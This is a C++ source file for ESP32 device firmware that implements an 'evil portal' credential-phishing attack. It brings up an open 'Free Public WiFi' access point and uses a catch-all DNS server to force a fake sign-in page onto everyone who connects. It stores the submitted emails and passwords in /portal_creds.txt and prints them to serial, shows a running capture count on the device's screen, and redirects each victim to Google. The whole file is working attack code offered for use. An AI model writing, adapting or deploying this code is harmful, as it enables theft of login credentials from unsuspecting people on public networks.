#pragma once
#include "../global.hpp"
#include "../display_utils.h"
#include "utils.hpp"
#include <WiFi.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>
#include <LittleFS.h>

const char portal_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign in</title>
<style>body{font-family:Arial;background:#f1f1f1}
form{background:#fff;padding:40px;margin:60px auto;max-width:340px;text-align:center}
input{width:100%;padding:12px;margin:6px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box}
button{background:#1a73e8;color:#fff;padding:12px;width:100%;border:none;border-radius:4px;font-size:16px}</style>
</head><body><form action="/post" method="post">
<b>Sign in</b> to continue<br><br>
<input name="email" placeholder="Email or phone" required><br>
<input name="password" type="password" placeholder="Password" required><br><br>
<button type="submit">Next</button></form></body></html>
)rawliteral";

void WiFi_EvilPortal()
{
    WiFi_Init();
    WiFi.mode(WIFI_AP);
    WiFi.softAP("Free Public WiFi");
    IPAddress ip = WiFi.softAPIP();

    DNSServer dns;
    dns.start(53, "*", ip);

    AsyncWebServer server(80);
    size_t captured = 0;

    server.on("/", HTTP_GET, [](AsyncWebServerRequest* r){
        r->send_P(200, "text/html", portal_html);
    });
    server.on("/post", HTTP_POST, [&captured](AsyncWebServerRequest* r){
        String line = "";
        if (r->hasParam("email", true))    line += "Email: " + r->getParam("email", true)->value();
        if (r->hasParam("password", true)) line += " | Pass: " + r->getParam("password", true)->value();
        if (line.length()) {
            File f = LittleFS.open("/portal_creds.txt", FILE_APPEND);
            if (f) { f.println(line); f.close(); }
            captured++;
            Serial.println(line);
        }
        r->redirect("https://www.google.com");
    });
    server.onNotFound([](AsyncWebServerRequest* r){ r->redirect("/"); });
    server.begin();

    HaltTillRelease(BUTTON_CENTER);
    while (!ReadButton(BUTTON_CENTER)) {
        display.clearDisplay();
        display.setTextSize(1);
        display.setCursor(0, 0);  display.print("EVIL PORTAL");
        display.setCursor(0, 14); display.print("AP: Free Public WiFi");
        display.setCursor(0, 26); display.print("Creds saved: "); display.print(captured);
        display.setCursor(0, 40); display.print("File: /portal_creds.txt");
        display.setCursor(0, 56); display.print("CENTER: stop");
        display.display();
        delay(200);
    }
    HaltTillRelease(BUTTON_CENTER);
    server.end();
    dns.stop();
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
}
